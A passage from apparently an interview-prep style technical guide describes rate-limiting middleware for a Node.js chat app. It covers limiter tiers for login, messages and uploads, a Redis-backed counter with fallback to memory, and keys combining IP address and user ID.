    message: 'Too many requests from this IP, please try again later.',
});

// Auth rate limiter - Stricter for login/signup
export const authLimiter = createRateLimiter({
    windowMs: 15 * 60 * 1000,
    max: process.env.NODE_ENV === 'development' ? 100 : 20,
    message: 'Too many authentication attempts, please try again later.',
    skipSuccessfulRequests: true, // Don't count successful logins
});

// Message rate limiter - 50 messages per minute
export const messageLimiter = createRateLimiter({
    windowMs: 60 * 1000, // 1 minute
    max: 50,
    message: 'Too many messages sent, please slow down.',
});

// Upload rate limiter - 10 uploads per hour
export const uploadLimiter = createRateLimiter({
    windowMs: 60 * 60 * 1000, // 1 hour
    max: 10,
    message: 'Too many uploads, please try again later.',
});

// API rate limiter - 200 requests per minute
export const apiLimiter = createRateLimiter({
    windowMs: 60 * 1000, // 1 minute
    max: 200,
    message: 'API rate limit exceeded, please try again later.',
});

// User data rate limiter - More lenient for fetching user lists
export const userDataLimiter = createRateLimiter({
    windowMs: 60 * 1000, // 1 minute
    max: 100,
    message: 'Too many requests for user data, please try again later.',
});

export default {
    globalLimiter,
    authLimiter,
    messageLimiter,
    uploadLimiter,
    apiLimiter,
    userDataLimiter,
};
```

---

### **5.5.2 Rate Limiter Comparison Table**

| Tier | Window | Max Requests | Use Case | Skip Successful |
|------|--------|--------------|----------|-----------------|
| **globalLimiter** | 15 min | 500 (prod) / 1000 (dev) | All endpoints | No |
| **authLimiter** | 15 min | 20 (prod) / 100 (dev) | Login, signup | Yes |
| **messageLimiter** | 1 min | 50 | Send DM/group message | No |
| **uploadLimiter** | 1 hour | 10 | Profile pic, image upload | No |
| **apiLimiter** | 1 min | 200 | General API routes | No |
| **userDataLimiter** | 1 min | 100 | Fetch users, search | No |

---

### **5.5.3 Redis Store Implementation**

**How It Works:**

```
Without Redis (Memory Store):
- Rate limits stored in Node.js process memory
- Problem: Limits NOT shared across instances
- User can bypass by hitting different servers

With Redis Store:
- Rate limits stored in Redis
- All server instances check same Redis
- User CANNOT bypass by server hopping
```

**Redis Data Structure:**
```
Key: ratelimit:192.168.1.1-507f...011
Value: { totalHits: 45, resetTime: 1699564800 }
TTL: windowMs (auto-expires)
```

**Flow:**
```
1. Request arrives: POST /api/auth/login
2. authLimiter middleware runs
3. Generate key: `192.168.1.1-${userId}` (if authenticated) or just `192.168.1.1`
4. Redis: INCR ratelimit:192.168.1.1
   - If first request: SET ratelimit:192.168.1.1 1 EX 900 (15 min)
   - If subsequent: INCR returns current count
5. Check: count > max?
   - If yes: return 429 Too Many Requests
   - If no: next()
6. Set headers:
   - RateLimit-Limit: 20
   - RateLimit-Remaining: 15
   - RateLimit-Reset: 1699564800
```

---

### **5.5.4 Fallback to Memory**

**Graceful Degradation:**

```javascript
if (!isRedisConnected()) {
    console.warn('⚠️  Redis not connected, using memory store');
    return rateLimit({
        windowMs,
        max,
        message: { error: message },
        standardHeaders: true,
        legacyHeaders: false,
    });
}
```

**Why This Matters:**
- App continues functioning even if Redis is down
- Development mode works without Redis setup
- Production degrades gracefully (single-instance limits better than none)

> **Interview Tip:** This demonstrates **resilience engineering** - the system degrades gracefully rather than failing completely.

---

### **5.5.5 Custom Key Generation**

```javascript
keyGenerator: (req) => {
    if (req.user && req.user._id) {
        return `${req.ip}-${req.user._id}`;
    }
    return req.ip;
},
```

**Why IP + User ID?**

```
Scenario 1: Public WiFi (Same IP, Different Users)
- User A: 192.168.1.1-507f...011
- User B: 192.168.1.1-507f...012
- Separate limits (fair)

Scenario 2: VPN Abuse
- User tries to bypass by reconnecting VPN (new IP)
- Still tracked by User ID after authentication
- Cannot spam by IP hopping

Scenario 3: Unauthenticated Routes (login, signup)
- No user ID yet
- Use IP only: 192.168.1.1
- Prevents brute-force attacks
```

---

*[Chapter 5 Complete - ~2,500 lines covering authentication, real-time messaging, group chat, Redis presence, and rate limiting with complete code examples]*

---

